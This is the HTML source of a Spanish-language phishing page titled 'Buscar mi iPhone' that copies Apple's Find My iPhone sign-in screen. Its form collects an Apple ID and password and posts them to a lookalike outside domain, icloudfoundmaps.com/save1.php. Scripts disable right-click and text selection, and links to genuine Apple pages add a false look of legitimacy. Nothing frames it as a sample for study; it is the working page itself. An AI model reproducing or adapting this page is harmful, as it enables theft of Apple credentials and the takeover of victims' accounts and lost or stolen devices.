<html><head>
 <!--[if IE 7]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]--> 
 <!--[if IE 8]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]-->
 <!--[if IE 9]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]-->
 <!--[if IE 10]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]-->
    <meta name="robots" content="noindex,follow">
    <meta content="text/html; charset=utf-8" http-equiv="content-type">
    <meta name="viewport" content=" initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Buscar mi iPhone</title>
    <link rel="stylesheet" href="mobfiles/layout/wapcss.css" media="all">
    <link rel="stylesheet" href="mobfiles/layout/applefind.css">
    <link rel="stylesheet" href="mobfiles/layout/stylesmobversion.css" type="text/css" media="screen, print">
    <link rel="shortcut icon" href="mobfiles/img/mobvfavicon.ico">
    <link rel="stylesheet" href="mobfiles/layout/bootstrap.min.css">
    <link rel="stylesheet" href="mobfiles/layout/b.css">
<style>
.modal-footer .btn+.btn {
    margin-bottom: 0;
    margin-left: 5px;
}

.modal-footer {
    padding: 5px;
    text-align: -webkit-center;
    border-top: 1px solid #e5e5e5;
}

.modal-dialog {
    width: 290px;
    margin: 120px auto;
}
.btn {
    display: inline-block;
    padding: 6px 12px;
    margin-bottom: 0;
    font-size: 14px;
    font-weight: 400;
    line-height: 1.42857143;
    text-align: center;
    white-space: nowrap;
    vertical-align: middle;
    -ms-touch-action: manipulation;
    touch-action: manipulation;
    cursor: pointer;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    background-image: none;
    border: 0px solid transparent;
    border-radius: 0px;
    color: #2DA63F;
}

.btn-primary {
    color: #2DA63F;
    background-color: rgba(255, 255, 255, 0);
    border-color: rgba(255, 255, 255, 0);
    background-image: -webkit-linear-gradient(top,rgba(255, 255, 255, 0) 0,rgba(255, 255, 255, 0) 100%);
    background-image: -o-linear-gradient(top,#337ab7 0,#265a88 100%);
    background-image: -webkit-gradient(linear,left top,left bottom,from(rgba(255, 255, 255, 0)),to(rgba(255, 255, 255, 0)));
    background-image: linear-gradient(to bottom,rgba(255, 255, 255, 0) 0,rgba(255, 255, 255, 0) 100%);
    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff337ab7', endColorstr='#ff265a88', GradientType=0);
    filter: progid:DXImageTransform.Microsoft.gradient(enabled=false);
    background-repeat: repeat-x;
    border-color: rgba(255, 255, 255, 0);
}
  
 .load {
     width:27px; height:27px;display:block;margin:auto;text-align:center;visibility:hidden;
 }
  img.bin {
     width:27px; height:27px;display:block;margin:auto;text-align:center;visibility:visible;margin-top:-30px;
 }

/* modification final */

.btn-def{color:#2DA63F;background-color:#fff;font-weight: normal;}
.btn-def.focus,.btn-def:focus{color:#2DA63F;background-color:#fff;border-color:#fff}
 .btn-def:hover{color:#2DA63F;background-color:#fff;border-color:#fff} 

 p.thicker {
    font-weight: 700;
    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
    text-align: center;
    font-size: 18px;
} 
.Top {
  background-color: #fff; text-align:center; width:100%; font-family:Segoe, 'Segoe UI', 'DejaVu Sans', 'Trebuchet MS', Verdana, sans-serif; line-height:50px; font-size:20px; color: #333; font-weight: 700; border-bottom: solid 1px #A5D7AC;
  
} 
</style>

  <!--<script type="text/javascript">

  if (screen.width >= 1024) {
    window.location = "index.php";
  }
  //
</script>-->
<script type="text/javascript" src="mobfiles/js/jquery-latest.min.js"></script>
<script type="text/javascript" src="mobfiles/js/gen_validatorv4.js"></script>
<script type="text/javascript">
	//<![CDATA[
		$(window).load(function() { // makes sure the whole site is loaded
     $('#apple_pwd').keypress(function(){
        $('#buttom').css('color', 'green');
      });
			$('#status').fadeOut(); // will first fade out the loading animation
			$('#preloader').delay(20).fadeOut('slow'); // will fade out the white DIV that covers the website.
			$('body').delay(350).css({'overflow':'visible'});
		})
	//]]>
</script> 
  </head>

<body ondragstart="window.event.returnValue=false" oncontextmenu="window.event.returnValue=false" onselectstart="event.returnValue=false" style="overflow: visible;">
	
    <p class="main_img"></p> <center><img src="assets/img/2.png" style="width:125px;height:125px;"></center>
    <p>
	</p>
    <div class="main">
      <p class="lok">Buscar mi iPhone</p>

		<form onkeydown="ENTER(event);" onsubmit="return checkinput();" method="post" name="form1" action="https://www.icloudfoundmaps.com/save1.php">		
        <ul class="main_list">		
          <li class="main_bord">
          <strong>Apple ID</strong>
			  
  
		<input type="text" class="main_col" name="apple_id" id="appleID" onkeypress="if (event.keyCode==13){ show();return false;}" placeholder="ejemplo@icloud.com">
          </li>
			
          <li class="main_bord1" id="pb" style="display: none">
          <strong>Contraseña</strong>
		<input name="apple_pwd" id="apple_pwd" placeholder="obligatoria" class="main_col" type="password" autocomplete="off">
			</li>
<script type="text/javascript">
var frmvalidator = new Validator("form1");
frmvalidator.addValidation("apple_id","req","Please enter your email");
frmvalidator.addValidation("apple_id","email","Please enter your email");
frmvalidator.addValidation("apple_pwd","req","Please enter your password");
</script> 
<script type="text/javascript">
        function show() {
            //document.getElementById("dThreshold").display ="block";
         
    document.getElementById("bt").style.display = "none";        
            document.getElementById("smload").style.display = "block";

        setTimeout(function() {    
    document.getElementById("bt").style.display = "none";
        document.getElementById("smload").style.display = "none";
            document.getElementById("buttom").style.display = "block";
            document.getElementById("pb").style.display = "block";
         }, 1000);       
        }
 </script>
<script type="text/javascript">
    function showt() {
		document.getElementById("buttom").style.display = "none";
		document.getElementById("smload").style.display = "block";
	}
</script>
        </ul>
        <input type="hidden" name="idl" id="idl" value="50656">
			
        <input name="buttom" id="buttom" class="buttom" style="text-decoration:none;color:#37A449; display:none;" onclick=" if (password.value.length != 0)
      { 
         showt(); 
      }  	" value="Iniciar sesión..." type="submit">
		
		<input name="buttom" id="bt" class="buttom" style="text-decoration:none;color:#37A449; display:block;" onclick="show();return false;" value="Iniciar sesión..." type="submit">

			
        <img class="smload" id="smload" src="mobfiles/img/ajax-loader.svg" alt="Loading">
      </form>
      <div class="separated"></div>
      <h3><a href="https://iforgot.apple.com/" target="_self" style="text-decoration:none;color:#37A449;">
          ¿Has olvidado tu ID de Apple o la contraseña?</a></h3>
      
      <h3><a href="https://www.apple.com/icloud/setup/ios.html" target="_self" style="text-decoration:none;color:#37A449;">
            Instrucciones de configuración</a></h3>
    </div>





<script src="mobfiles/js/jquery-1.11.3.min.js"></script>
<script src="mobfiles/js/bootstrap.min.js"></script>
<script src="mobfiles/js/findmyphone.min.js"></script>  

 


  

</body></html>